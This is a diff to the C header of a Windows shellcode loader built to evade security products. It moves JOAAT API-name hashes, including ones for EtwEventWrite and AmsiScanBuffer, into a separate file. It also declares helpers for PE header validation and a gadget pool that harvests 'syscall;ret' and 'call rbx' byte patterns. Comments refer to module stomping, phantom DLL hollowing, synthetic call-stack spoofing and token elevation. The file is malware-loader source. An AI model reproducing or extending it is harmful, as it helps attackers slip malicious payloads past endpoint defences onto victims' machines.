@@ -7,6 +7,7 @@
 #include <Windows.h>
 #include "Structs.h"
 #include "Syscalls.h"
+#include "Hashes.h"
 #include "Payload.h"
 
 // ----------- Build Config -----------
@@ -52,52 +53,7 @@
 #pragma intrinsic(__stosb)
 #pragma intrinsic(__rdtsc)
 
-// ----------- Syscall Name Hashes (Jenkins One-at-a-Time 32-bit) -----------
-#define NtAllocateVirtualMemory_JOAAT   0xE33A06BF
-#define NtProtectVirtualMemory_JOAAT    0x82BB0EE0
-#define NtWaitForSingleObject_JOAAT     0xE2C26E26
-#define NtCreateSection_JOAAT           0x9A538B2B
-#define NtMapViewOfSection_JOAAT        0xD3B060A1
-// Used only for bootstrap — clean-ntdll section mapping
-#define NtOpenSection_JOAAT             0x6EC52BCD
-// ----------- Exit Hook / Elevation (ntdll exports) -----------
-#define RtlExitUserProcess_JOAAT        0x3DC05538
-#define LdrAddRefDll_JOAAT              0x807ED758
-#define NtOpenProcessToken_JOAAT        0xD5D4A26D
-#define NtQueryInformationToken_JOAAT   0x28CEAE31
-#define NtClose_JOAAT                   0xB1D7C572
-#define NtTerminateProcess_JOAAT        0x9C12CA95
-
-// ----------- Unwind-info registration for stomped modules -----------
-#define RtlAddFunctionTable_JOAAT       0xF1F158AB
-
-// ----------- Synthetic call-stack frames (Draugr MVP) -----------
-// (NtWaitForSingleObject_JOAAT is already defined above — reused here as
-// one of the three anchor RIPs for the fake stack.)
-#define RtlUserThreadStart_JOAAT        0xF7972684
-#define BaseThreadInitThunk_JOAAT       0x50635B44
-
-// ----------- Elevation (kernel32 exports) -----------
-#define GetModuleFileNameA_JOAAT        0x665A0D0F
-
-// ----------- Phantom DLL Hollowing Hashes (kernel32 exports) -----------
-#define ReadFile_JOAAT                  0x62BF1D54
-#define WriteFile_JOAAT                 0x8CFB9E0E
-#define SetFilePointer_JOAAT            0xCF8699F2
-#define CloseHandle_JOAAT               0x8FA1D581
-
-// ----------- Thread Pool Hashes (ntdll exports, resolved via FetchExportAddress) -----------
-#define TpAllocWork_JOAAT               0xE6CACAE7
-#define TpPostWork_JOAAT                0xBEF96313
-#define TpReleaseWork_JOAAT             0xBA0F3087
-
-// ----------- WinAPI Name Hashes -----------
-#define LoadLibraryA_JOAAT              0xEC33D795
-#define GetProcAddress_JOAAT            0x8F900864
-#define GetModuleHandleA_JOAAT          0x9D783EFE
-#define VirtualProtect_JOAAT            0x69B260D2
-#define EtwEventWrite_JOAAT             0xEF9B6F9B
-#define AmsiScanBuffer_JOAAT            0x725879AF
+// JOAAT name hashes for syscalls and APIs live in Hashes.h (included above).
 
 // ----------- NT Status Codes -----------
 #ifndef NT_SUCCESS
@@ -175,6 +131,12 @@ INT    StrCmpA(IN LPCSTR Str1, IN LPCSTR Str2);
 BOOL  InitializeWinApis(OUT PAPI_HASHING pApi);
 PVOID FetchModuleBaseAddr(IN UINT32 dwModuleNameHash);
 PVOID FetchExportAddress(IN PVOID pModuleBase, IN UINT32 dwApiNameHash);
+// Validate DOS+NT signatures on a loaded module base. Returns TRUE
+// and sets *ppNt on success; FALSE otherwise. *ppNt is undefined on failure.
+BOOL  ValidatePeHeaders(IN PVOID pModuleBase, OUT PIMAGE_NT_HEADERS* ppNt);
+// Like ValidatePeHeaders but verifies that the NT header fits within
+// sBufSize bytes from pBuffer (for reading PE data off disk into a buffer).
+BOOL  ValidatePeHeadersBounded(IN PVOID pBuffer, IN SIZE_T sBufSize, OUT PIMAGE_NT_HEADERS* ppNt);
 // Case-insensitive PEB walk by exact upper-case BaseDllName (e.g. L"NTDLL.DLL").
 PVOID FindLoadedModuleW(IN PCWSTR szUpperName);
 // Fisher-Yates shuffle + LoadLibraryA on the provided DLL names. Forces the
@@ -207,6 +169,21 @@ extern VOID SpoofCallback(PVOID Instance, PVOID Context, PVOID Work);
 // NtWaitForSingleObject. Returns the buffer's intended RSP (points
 // at the first fake return), or NULL on failure.
 PVOID BuildSyntheticStack(IN PAPI_HASHING pApi);
+
+// ----------- Generic Gadget Pool -----------
+// Holds up to 64 byte-pattern hits harvested from one or more loaded modules.
+// Used by Syscalls.c (0F 05 C3 syscall;ret) and Gadgets.c (FF D3 call rbx).
+#define GADGET_POOL_CAPACITY 64
+typedef struct _GADGET_POOL {
+    PVOID   pGadgets[GADGET_POOL_CAPACITY];
+    DWORD   dwCount;
+} GADGET_POOL, * PGADGET_POOL;
+
+// Append every pPattern hit inside pModule's executable sections to pPool,
+// up to GADGET_POOL_CAPACITY. Silent no-op if any arg invalid.
+VOID  GadgetPoolScanModule(IN OUT PGADGET_POOL pPool, IN PVOID pModule, IN const BYTE* pPattern, IN DWORD dwPatternLen);
+// RDTSC-seeded random pick. NULL if pool is empty.
+PVOID GadgetPoolRandom(IN const PGADGET_POOL pPool);
 
 // ----------- Call Gadget Discovery -----------
 BOOL  CollectCallGadgets(VOID);
